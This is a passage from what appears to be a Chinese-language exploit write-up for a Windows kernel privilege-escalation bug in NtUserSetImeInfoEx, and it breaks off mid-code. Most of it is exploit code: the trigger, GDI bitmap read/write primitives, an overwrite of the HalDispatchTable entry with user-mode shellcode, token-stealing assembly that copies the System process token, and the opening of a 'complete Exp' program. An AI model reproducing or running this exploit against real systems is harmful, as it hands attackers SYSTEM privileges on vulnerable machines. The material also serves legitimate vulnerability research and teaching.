<span class="n">tmp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">w_pvscan0</span><span class="p">;</span>  <span class="c1">// if ( v3[5] != *a2 ) {...} bypass</span>
</code></pre></div></div>

<p>触发漏洞</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HWINSTA</span> <span class="n">hWinsta</span> <span class="o">=</span> <span class="n">CreateWindowStationA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">READ_CONTROL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">SetProcessWindowStation</span><span class="p">(</span><span class="n">hWinsta</span><span class="p">);</span>
<span class="n">NtUserSetImeInfoEx</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
</code></pre></div></div>

<p>若未开启<code class="language-plaintext highlighter-rouge">SMEP</code> ,修改<code class="language-plaintext highlighter-rouge">HalDispatchTable</code> 第二项为用户层shellcode</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">oldHalEntry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">ReadOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldHalEntry</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] oldHalEntry: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">oldHalEntry</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">GetSystemToken</span><span class="p">;</span>
<span class="n">WriteOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">GetSystemToken</span><span class="p">()</span>
 <span class="p">{</span>
     <span class="kr">__asm</span>
     <span class="p">{</span>
         <span class="n">pushad</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span><span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x124</span><span class="p">]</span>  <span class="c1">//CurrentThread</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x150</span><span class="p">]</span> <span class="c1">//Process  </span>
         <span class="n">lea</span> <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span>  <span class="c1">//MyProcess.Token</span>
 <span class="nl">noFind:</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">]</span>  <span class="c1">//Eprocess.ActiveProcessLinks</span>
         <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span><span class="mh">0xb8</span>        <span class="c1">//next Eprocess struct</span>
         <span class="n">mov</span> <span class="n">ebx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb4</span><span class="p">]</span>  <span class="c1">//PID</span>
         <span class="n">cmp</span> <span class="n">ebx</span><span class="p">,</span><span class="mi">4</span>
         <span class="n">jnz</span> <span class="n">noFind</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span>    <span class="c1">//System.Token</span>
         <span class="n">mov</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span><span class="n">eax</span>
         <span class="n">lock</span> <span class="n">inc</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
         <span class="n">lock</span> <span class="n">inc</span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
         <span class="n">popad</span>
         <span class="n">ret</span>
     <span class="p">}</span>
 <span class="p">}</span>
</code></pre></div></div>

<p>shellcode搜索系统中进程为4的进程 ( <code class="language-plaintext highlighter-rouge">System</code> ), 搜索到后, 复制其<code class="language-plaintext highlighter-rouge">Token</code> , 并替换自己进程的<code class="language-plaintext highlighter-rouge">Token</code> 实现提权.</p>

<p>最后调用<code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code> 来执行shellcode, 并恢复<code class="language-plaintext highlighter-rouge">HalDispatchTable</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_NtQueryIntervalProfile</span> <span class="n">NtQueryIntervalProfile</span><span class="p">;</span>
<span class="n">ULONG</span> <span class="n">Interval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span><span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
<span class="n">NtQueryIntervalProfile</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Interval</span><span class="p">);</span>
<span class="n">WriteOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldHalEntry</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</code></pre></div></div>

<p>完整Exp</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;intrin.h&gt;</span><span class="cp">
</span><span class="k">using</span> <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">;</span>
<span class="k">using</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
<span class="k">using</span> <span class="n">std</span><span class="o">::</span><span class="n">showbase</span><span class="p">;</span>
<span class="k">using</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span><span class="p">;</span>
<span class="cp">#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)
#define STATUS_SUCCESS (NTSTATUS)0x0000000
</span><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_GdiCell</span>
<span class="p">{</span>
     <span class="n">PVOID</span> <span class="n">pKernelAddress</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wProcessIdl</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wCount</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wUpper</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">uType</span><span class="p">;</span>
     <span class="n">PVOID</span> <span class="n">pUserAddress</span><span class="p">;</span>
<span class="p">}</span><span class="n">GdiCell</span><span class="p">,</span><span class="o">*</span><span class="n">pGdiCell</span><span class="p">;</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SYSTEM_MODULE_ENTRY</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">Section</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">MappedBase</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">ImageBase</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">ImageSize</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">LoadOrderIndex</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">InitOrderIndex</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">LoadCount</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">OffsetToFileName</span><span class="p">;</span>
    <span class="n">UCHAR</span> <span class="n">FullPathName</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_ENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_ENTRY</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SYSTEM_MODULE_INFORMATION</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">Count</span><span class="p">;</span>
    <span class="n">SYSTEM_MODULE_ENTRY</span> <span class="n">Module</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>
<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SYSTEM_INFORMATION_CLASS</span> <span class="p">{</span>
 <span class="n">SystemBasicInformation</span><span class="p">,</span> <span class="c1">// 0 Y N</span>
 <span class="n">SystemProcessorInformation</span><span class="p">,</span> <span class="c1">// 1 Y N</span>
 <span class="n">SystemPerformanceInformation</span><span class="p">,</span> <span class="c1">// 2 Y N</span>
 <span class="n">SystemTimeOfDayInformation</span><span class="p">,</span> <span class="c1">// 3 Y N</span>
 <span class="n">SystemNotImplemented1</span><span class="p">,</span> <span class="c1">// 4 Y N</span>
 <span class="n">SystemProcessesAndThreadsInformation</span><span class="p">,</span> <span class="c1">// 5 Y N</span>
 <span class="n">SystemCallCounts</span><span class="p">,</span> <span class="c1">// 6 Y N</span>
 <span class="n">SystemConfigurationInformation</span><span class="p">,</span> <span class="c1">// 7 Y N</span>
 <span class="n">SystemProcessorTimes</span><span class="p">,</span> <span class="c1">// 8 Y N</span>
 <span class="n">SystemGlobalFlag</span><span class="p">,</span> <span class="c1">// 9 Y Y</span>
 <span class="n">SystemNotImplemented2</span><span class="p">,</span> <span class="c1">// 10 Y N</span>
 <span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="c1">// 11 Y N    枚举内核模块时用</span>
 <span class="n">SystemLockInformation</span><span class="p">,</span> <span class="c1">// 12 Y N</span>
 <span class="n">SystemNotImplemented3</span><span class="p">,</span> <span class="c1">// 13 Y N</span>
 <span class="n">SystemNotImplemented4</span><span class="p">,</span> <span class="c1">// 14 Y N</span>
 <span class="n">SystemNotImplemented5</span><span class="p">,</span> <span class="c1">// 15 Y N</span>
 <span class="n">SystemHandleInformation</span><span class="p">,</span> <span class="c1">// 16 Y N</span>
 <span class="n">SystemObjectInformation</span><span class="p">,</span> <span class="c1">// 17 Y N</span>
 <span class="n">SystemPagefileInformation</span><span class="p">,</span> <span class="c1">// 18 Y N</span>
 <span class="n">SystemInstructionEmulationCounts</span><span class="p">,</span> <span class="c1">// 19 Y N</span>
 <span class="n">SystemInvalidInfoClass1</span><span class="p">,</span> <span class="c1">// 20</span>
 <span class="n">SystemCacheInformation</span><span class="p">,</span> <span class="c1">// 21 Y Y</span>
 <span class="n">SystemPoolTagInformation</span><span class="p">,</span> <span class="c1">// 22 Y N</span>
 <span class="n">SystemProcessorStatistics</span><span class="p">,</span> <span class="c1">// 23 Y N</span>
 <span class="n">SystemDpcInformation</span><span class="p">,</span> <span class="c1">// 24 Y Y</span>
 <span class="n">SystemNotImplemented6</span><span class="p">,</span> <span class="c1">// 25 Y N</span>
 <span class="n">SystemLoadImage</span><span class="p">,</span> <span class="c1">// 26 N Y</span>
 <span class="n">SystemUnloadImage</span><span class="p">,</span> <span class="c1">// 27 N Y</span>
 <span class="n">SystemTimeAdjustment</span><span class="p">,</span> <span class="c1">// 28 Y Y</span>
 <span class="n">SystemNotImplemented7</span><span class="p">,</span> <span class="c1">// 29 Y N</span>
 <span class="n">SystemNotImplemented8</span><span class="p">,</span> <span class="c1">// 30 Y N</span>
 <span class="n">SystemNotImplemented9</span><span class="p">,</span> <span class="c1">// 31 Y N</span>
 <span class="n">SystemCrashDumpInformation</span><span class="p">,</span> <span class="c1">// 32 Y N</span>
 <span class="n">SystemExceptionInformation</span><span class="p">,</span> <span class="c1">// 33 Y N</span>
 <span class="n">SystemCrashDumpStateInformation</span><span class="p">,</span> <span class="c1">// 34 Y Y/N</span>
 <span class="n">SystemKernelDebuggerInformation</span><span class="p">,</span> <span class="c1">// 35 Y N</span>
 <span class="n">SystemContextSwitchInformation</span><span class="p">,</span> <span class="c1">// 36 Y N</span>
 <span class="n">SystemRegistryQuotaInformation</span><span class="p">,</span> <span class="c1">// 37 Y Y</span>
 <span class="n">SystemLoadAndCallImage</span><span class="p">,</span> <span class="c1">// 38 N Y</span>
 <span class="n">SystemPrioritySeparation</span><span class="p">,</span> <span class="c1">// 39 N Y</span>
 <span class="n">SystemNotImplemented10</span><span class="p">,</span> <span class="c1">// 40 Y N</span>
 <span class="n">SystemNotImplemented11</span><span class="p">,</span> <span class="c1">// 41 Y N</span>
 <span class="n">SystemInvalidInfoClass2</span><span class="p">,</span> <span class="c1">// 42</span>
 <span class="n">SystemInvalidInfoClass3</span><span class="p">,</span> <span class="c1">// 43</span>
 <span class="n">SystemTimeZoneInformation</span><span class="p">,</span> <span class="c1">// 44 Y N</span>
 <span class="n">SystemLookasideInformation</span><span class="p">,</span> <span class="c1">// 45 Y N</span>
 <span class="n">SystemSetTimeSlipEvent</span><span class="p">,</span> <span class="c1">// 46 N Y</span>
 <span class="n">SystemCreateSession</span><span class="p">,</span> <span class="c1">// 47 N Y</span>
 <span class="n">SystemDeleteSession</span><span class="p">,</span> <span class="c1">// 48 N Y</span>
 <span class="n">SystemInvalidInfoClass4</span><span class="p">,</span> <span class="c1">// 49</span>
 <span class="n">SystemRangeStartInformation</span><span class="p">,</span> <span class="c1">// 50 Y N</span>
 <span class="n">SystemVerifierInformation</span><span class="p">,</span> <span class="c1">// 51 Y Y</span>
 <span class="n">SystemAddVerifier</span><span class="p">,</span> <span class="c1">// 52 N Y</span>
 <span class="n">SystemSessionProcessesInformation</span> <span class="c1">// 53 Y N</span>
<span class="p">}</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">;</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="kt">void</span> <span class="n">NtUserSetImeInfoEx</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">tmp</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">_asm</span> <span class="p">{</span>
		<span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="n">tmp</span><span class="p">;</span>
		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x1226</span><span class="p">;</span>
		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x7ffe0300</span><span class="p">;</span>
		<span class="n">call</span> <span class="n">dword</span> <span class="n">ptr</span><span class="p">[</span><span class="n">edx</span><span class="p">];</span>
		<span class="n">ret</span> <span class="mi">4</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="k">using</span> <span class="n">pNtAllocateVirtualMemory</span> <span class="o">=</span> <span class="n">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span><span class="p">)(</span>
	<span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">PVOID</span> <span class="n">BaseAddress</span><span class="p">,</span>
	<span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
	<span class="n">PSIZE_T</span> <span class="n">RegionSize</span><span class="p">,</span>
	<span class="n">ULONG</span> <span class="n">AllocateType</span><span class="p">,</span>
	<span class="n">ULONG</span> <span class="n">Protect</span>
<span class="p">);</span>
<span class="k">using</span> <span class="n">pZwQuerySystemInformation</span> <span class="o">=</span> <span class="n">NTSTATUS</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="p">)(</span>
  <span class="n">SYSTEM_INFORMATION_CLASS</span> <span class="n">SystemInformationClass</span><span class="p">,</span>
  <span class="n">PVOID</span>                    <span class="n">SystemInformation</span><span class="p">,</span>
  <span class="n">ULONG</span>                    <span class="n">SystemInformationLength</span><span class="p">,</span>
  <span class="n">PULONG</span>                   <span class="n">ReturnLength</span>
<span class="p">);</span>
<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">ULONG</span>   <span class="n">ProfileSource</span><span class="p">,</span>
    <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">Interval</span>
<span class="p">);</span>
<span class="n">VOID</span> <span class="n">ReadOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span><span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">writeAddr</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">readValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">writeAddr</span><span class="p">);</span>
  <span class="n">GetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">readValue</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">VOID</span> <span class="n">WriteOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span> <span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">writeAddr</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">writeValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeAddr</span><span class="p">);</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">writeValue</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="n">RepoErrorExit</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Error "</span> <span class="o">&lt;&lt;</span> <span class="n">msg</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span> 
	<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="n">RepoSuccess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] "</span> <span class="o">&lt;&lt;</span> <span class="n">msg</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="kr">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">GetSystemToken</span><span class="p">()</span>
 <span class="p">{</span>
     <span class="kr">__asm</span>
     <span class="p">{</span>
         <span class="n">pushad</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span><span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x124</span><span class="p">]</span>  <span class="c1">//CurrentThread</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x150</span><span class="p">]</span> <span class="c1">//Process  </span>
         <span class="n">lea</span> <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span>  <span class="c1">//MyProcess.Token</span>
 <span class="nl">noFind:</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">]</span>  <span class="c1">//Eprocess.ActiveProcessLinks</span>
         <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span><span class="mh">0xb8</span>        <span class="c1">//next Eprocess struct</span>
         <span class="n">mov</span> <span class="n">ebx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb4</span><span class="p">]</span>  <span class="c1">//PID</span>
         <span class="n">cmp</span> <span class="n">ebx</span><span class="p">,</span><span class="mi">4</span>
         <span class="n">jnz</span> <span class="n">noFind</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span>    <span class="c1">//System.Token</span>
         <span class="n">mov</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span><span class="n">eax</span>
         <span class="n">lock</span> <span class="n">inc</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
         <span class="n">lock</span> <span class="n">inc</span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
         <span class="n">popad</span>
         <span class="n">ret</span>
     <span class="p">}</span>
 <span class="p">}</span>
<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">GetNtoskrnl</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hNtdll</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">auto</span> <span class="n">ZwQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">pZwQuerySystemInformation</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span> <span class="s">"ZwQuerySystemInformation"</span><span class="p">);</span>
	<span class="n">SIZE_T</span> <span class="n">SysModLen</span><span class="p">;</span>
	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">SysModuleInfo</span><span class="p">;</span>
	<span class="n">ZwQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">SysModLen</span><span class="p">);</span>
	<span class="n">SysModuleInfo</span> <span class="o">=</span> <span class="p">(</span><span class="k">decltype</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">))</span><span class="n">malloc</span><span class="p">(</span><span class="n">SysModLen</span><span class="p">);</span>
	<span class="n">ZwQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="n">SysModuleInfo</span><span class="p">,</span> <span class="n">SysModLen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">SysModLen</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"ZwQuerySystemInformation Function Fail..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">SysModuleInfo</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">LPCSTR</span> <span class="kr">inline</span> <span class="n">GetNtoskrnlName</span><span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">sysinfo</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">LPCSTR</span> <span class="n">NtoskrnlName</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">sysinfo</span><span class="o">-&gt;</span><span class="n">Module</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">FullPathName</span><span class="p">,</span><span class="sc">'\\'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
	<span class="k">return</span> <span class="n">NtoskrnlName</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">PVOID</span> <span class="kr">inline</span> <span class="n">GetNtoskrnlBase</span><span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">sysinfo</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">sysinfo</span><span class="o">-&gt;</span><span class="n">Module</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBase</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">DWORD</span> <span class="kr">inline</span> <span class="n">GetPeb</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">teb</span> <span class="o">=</span> <span class="n">__readfsdword</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">peb</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">teb</span><span class="p">)</span><span class="o">+</span><span class="mh">0x30</span><span class="p">);</span>
<span class="cp">#ifdef DEBUG
</span>	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] Teb: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">teb</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] Peb: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">peb</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
<span class="cp">#endif
</span>	<span class="k">return</span> <span class="n">peb</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">HMODULE</span> <span class="n">hNtdll</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hNtdll</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hNtdll</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"cannot open ntdll.dll..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">SysModuleInfo</span> <span class="o">=</span> <span class="n">GetNtoskrnl</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">NtoskrnlBase</span> <span class="o">=</span> <span class="n">GetNtoskrnlBase</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">LPCSTR</span> <span class="n">NtoskrnlName</span> <span class="o">=</span> <span class="n">GetNtoskrnlName</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">RepoSuccess</span><span class="p">(</span><span class="n">NtoskrnlName</span><span class="p">);</span>
	<span class="n">HMODULE</span> <span class="n">hNtoskrnl</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">NtoskrnlName</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hNtoskrnl</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hNtoskrnl</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"cannot load Ntoskrnl.exe..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">free</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtoskrnl</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"Cannot find HalDispatchTable..."</span><span class="p">);</span>
<span class="cp">#ifdef DEBUG
